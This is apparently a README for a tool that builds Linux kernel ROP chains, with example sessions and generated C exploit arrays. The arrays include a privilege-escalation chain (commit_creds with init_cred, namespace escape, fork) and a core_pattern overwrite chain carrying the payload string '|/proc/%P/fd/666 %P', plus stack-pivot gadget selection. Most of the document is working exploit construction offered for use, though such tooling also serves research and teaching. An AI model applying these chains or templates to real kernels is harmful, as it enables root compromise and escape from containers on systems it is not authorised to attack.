# exkrop — Interactive Kernel ROP Chain Generator

CLI tool that wraps [exrop](../README.md) to provide a guided workflow for generating kernel ROP chains with pivot gadget selection and C code output.

## Usage

```
PYTHONPATH=. python3 -m exkrop <vmlinux>
```

## Features

- **Template-based chain building** — choose from predefined exploit templates:
  - **Privilege Escalation**: `commit_creds(init_cred)` + namespace escape via `switch_task_namespaces` + `fork` + `msleep`
  - **core_pattern Overwrite**: `_copy_from_user(core_pattern, user_buf, len)` + `msleep`
- **KASLR-relative output** — all kernel addresses emitted as `KERN(offset)` with a `KERN_BASE` macro
- **Pivot gadget browser** — paginated selection of stack pivot gadgets (direct, offset, JOP chained, indirect) with detail view
- **Reserved offset handling** — specify object offsets that must be preserved (e.g., vtable pointers) using individual values or ranges (`0x0-0x10,0x60`); shift gadgets are automatically inserted to skip over them
- **Side-effect detection** — pivot gadgets with memory writes to the controlled object (e.g., `or byte ptr [rbx + 0x41], bl`) are detected; corrupted offsets are automatically treated as occupied and skipped
- **Pivot filtering** — pivots whose chain start conflicts with reserved offsets are filtered out before selection
- **JOP dispatch awareness** — JOP pivot dispatch entries are treated as occupied slots and automatically skipped
- **C code generation** — for inline pivots, a single `exploit_obj[]` array; for indirect pivots, separate `exploit_obj[]` (dispatch + pointer) and `rop_chain[]` (at known address) arrays, all with `#define`s and per-line annotations

## Workflow

1. Load vmlinux and gadget cache
2. Select exploit template
3. Resolve kernel symbols and base address
4. Build ROP chain
5. Select pivot source register (rdi, rsi, rdx, etc.)
6. Optionally specify reserved object offsets
7. Browse and select a pivot gadget
8. Get generated C code (with optional file save)

## Example Output

### core_pattern Overwrite with Reserved Offsets and Side-Effect Detection

This example shows reserved offset ranges, pivot filtering, and automatic side-effect write detection. The pivot gadget `or byte ptr [rbx + 0x41], bl` would corrupt offset `0x40` — exkrop detects this and inserts shift gadgets to skip over it along with user-reserved offsets.

```
$ exkrop /path/to/vmlinux
Loading /path/to/vmlinux...
Loading cache from ./_path_to_vmlinux_kernel_d15.exrop_cache
Include non-clean gadgets (side effects)? [y/N]: y
Gadgets loaded.

=== ROP Chain Templates ===
  [1] Privilege Escalation — commit_creds(init_cred) + namespace escape + fork + msleep
  [2] core_pattern Overwrite — _copy_from_user(core_pattern, user_buf, len) + msleep

Select template [1-2]: 2

Resolving kernel base...
  Kernel base: 0xffffffff81000000
Resolving symbols...
  _copy_from_user                0xffffffff81b70980 (base + 0xb70980)
  core_pattern                   0xffffffff842107e0 (base + 0x32107e0)
  msleep                         0xffffffff812732f0 (base + 0x2732f0)

=== Building ROP chain ===

Core pattern string [|/proc/%P/fd/666 %P]:
User-space buffer address (hex) [0x4141414141414141]:
[*] _copy_from_user(core_pattern, 0x4141414141414141, 20)
$RSP+0x0000 : 0xffffffff81177704 # pop rdi ; ret
$RSP+0x0008 : 0xffffffff842107e0
$RSP+0x0010 : 0xffffffff810260b6 # pop rdx ; ret
$RSP+0x0018 : 0x0000000000000014
$RSP+0x0020 : 0xffffffff8115fbce # pop rsi ; ret
$RSP+0x0028 : 0x4141414141414141
$RSP+0x0030 : 0xffffffff81b70980

[*] msleep(1000000000)
$RSP+0x0000 : 0xffffffff81177704 # pop rdi ; ret
$RSP+0x0008 : 0x000000003b9aca00
$RSP+0x0010 : 0xffffffff812732f0

=== Pivot Register ===
  [ 1] rdi
  ...

Select pivot source register [1-13]: 5
Reserved object offsets (hex, comma-separated, e.g. 0x10,0x18 or 0x0-0x10) [none]: 0x0-0x10,0x60
  Reserved offsets: 0x0, 0x8, 0x10, 0x60

Searching for pivots from rbx...
Filtered 28 pivot(s) conflicting with reserved offsets.
Include indirect pivots (require known object address)? [y/N]: y
Found 7 pivot(s).

--- Pivot candidates (1-7 of 7) ---
  [ 1] offset         @ 0xffffffff81704143 # push rbx ; or byte ptr [rbx + 0x41], bl ; pop rsp ; ... (chain at +0x18)
  [ 2] offset         @ 0xffffffff8123a45b # push rbx ; add dword ptr [rcx + 0x415d5be8], ecx ; pop rsp ; ... (chain at +0x18)
  ...
  [d N] Details  [q] Quit

Select pivot: 1

Selected pivot:
Pivot type: offset
  Gadget: 0xffffffff81704143 # push rbx ; or byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret
  Source register: rbx
  Offset: 0x18
  ROP chain starts at [rbx+0x18]
Pivot side-effect writes: 0x40

Occupied offsets within chain region: 0x40, 0x60
  0x40: side-effect write
  0x60: reserved by user
Inserting shift gadgets to skip occupied slots...
  0x38: lea rsp, [rsp + 8] ; ret (skip 0x8 bytes)
  0x58: lea rsp, [rsp + 8] ; ret (skip 0x8 bytes)

=== Generated C code ===

#include <stdint.h>

#define KERN_BASE 0xffffffff81000000ULL
#define KERN(off) (KERN_BASE + (off))

// core_pattern overwrite: crash a child to trigger payload

// NOTE: place 20 bytes at user address 0x4141414141414141:
// char pattern[] = "|/proc/%P/fd/666 %P";

/*
 * Pivot type: offset
 * Source register: rbx
 * Gadget: KERN(0x704143) @ push rbx ; or byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret
 * Offset: 0x18
 * ROP chain starts at [rbx+0x18]
 */
#define PIVOT_GADGET KERN(0x704143)
#define OBJ_SIZE     0x100
#define CHAIN_OFFSET 0x18

uint64_t exploit_obj[] = {
    0x0000000000000000ULL , // +0x00 | RESERVED
    0x0000000000000000ULL , // +0x08 | RESERVED
    0x0000000000000000ULL , // +0x10 | RESERVED
    KERN(0x177704)        , // +0x18 | ROP chain start | pop rdi ; ret
    KERN(0x32107e0)       , // +0x20 | core_pattern
    KERN(0x260b6)         , // +0x28 | pop rdx ; ret
    0x0000000000000014ULL , // +0x30
    KERN(0x177b940)       , // +0x38 | shift: lea rsp, [rsp + 8] ; ret (skip 0x8)
    0x0000000000000000ULL , // +0x40 | RESERVED
    KERN(0x15fbce)        , // +0x48 | pop rsi ; ret
    0x4141414141414141ULL , // +0x50
    KERN(0x177b940)       , // +0x58 | shift: lea rsp, [rsp + 8] ; ret (skip 0x8)
    0x0000000000000000ULL , // +0x60 | RESERVED
    KERN(0xb70980)        , // +0x68 | _copy_from_user
    KERN(0x177704)        , // +0x70 | pop rdi ; ret
    0x000000003b9aca00ULL , // +0x78
    KERN(0x2732f0)        , // +0x80 | msleep
};
```

Shift gadgets at `+0x38` and `+0x58` skip over the side-effect write at `+0x40` and the user-reserved offset at `+0x60`, keeping the ROP chain intact.

### Indirect JOP Pivot (chain at separate known address)

For indirect pivots, the object only holds dispatch entries and a pointer to the ROP chain. The chain itself lives at a separate known address (e.g., a `pipe_buffer` page or mmap'd region). Enable non-clean gadgets to see indirect pivots.

```
Include non-clean gadgets (side effects)? [y/N]: y
...
--- Pivot candidates (1-10 of 17) ---
  ...
  [ 8] jop_indirect   @ 0xffffffff81ac8d6e # mov rdx, qword ptr [rdi + 0x38] ; ... (ptr at +0x38)
  ...

Select pivot: 8

=== Generated C code ===

#include <stdint.h>

#define KERN_BASE 0xffffffff81000000ULL
#define KERN(off) (KERN_BASE + (off))

// Privilege escalation: get root + escape namespaces

/*
 * Pivot type: jop_indirect
 * Source register: rdi
 * Step 1: KERN(0xac8d6e) @ mov rdx, qword ptr [rdi + 0x38] ; mov rax, qword ptr [rdi + 0x30] ; mov rdi, rdx ; jmp rax
 * Pivot: KERN(0x254fba) @ push rdx ; add dword ptr [rcx + 0x415d5bd8], ecx ; pop rsp ; ret
 * Dispatch: place KERN(0x254fba) at [rdi+0x30]
 * Place ROP chain address at [rdi+0x38]
 */
#define PIVOT_GADGET KERN(0xac8d6e)
#define OBJ_SIZE     0x100
#define CHAIN_ADDR   0xDEADBEEFULL  // TODO: set to rop_chain address
#define PTR_OFFSET   0x38
#define DISPATCH_0_OFFSET 0x30

uint64_t exploit_obj[] = {
    0x0000000000000000ULL , // +0x00
    0x0000000000000000ULL , // +0x08
    0x0000000000000000ULL , // +0x10
    0x0000000000000000ULL , // +0x18
    0x0000000000000000ULL , // +0x20
    0x0000000000000000ULL , // +0x28
    KERN(0x254fba)        , // +0x30 | dispatch[0] -> KERN(0x254fba)
    CHAIN_ADDR            , // +0x38 | pointer to chain -> CHAIN_ADDR
};

uint64_t rop_chain[] = {
    KERN(0x177704)        , // pop rdi ; ret
    KERN(0x30953a0)       , // init_cred
    KERN(0x1e37d0)        , // commit_creds
    KERN(0x5cd6ad)        , // mov edi, 1 ; mov eax, edi ; ret
    KERN(0x1d6c00)        , // find_task_by_vpid
    KERN(0x143485a)       , // push rax ; add eax, ebp ; pop rdi ; ret
    KERN(0x15fbce)        , // pop rsi ; ret
    KERN(0x3094e80)       , // init_nsproxy
    KERN(0x1e16d0)        , // switch_task_namespaces
    KERN(0x177704)        , // pop rdi ; ret
    0x0000000000000000ULL ,
    KERN(0x1a6440)        , // __x64_sys_fork
    KERN(0x177704)        , // pop rdi ; ret
    0x000000003b9aca00ULL ,
    KERN(0x2732f0)        , // msleep
};
```

Set `CHAIN_ADDR` to the runtime address where `rop_chain` is placed in kernel memory. The dispatch at `+0x30` and pointer at `+0x38` occupy separate non-colliding slots in the object.
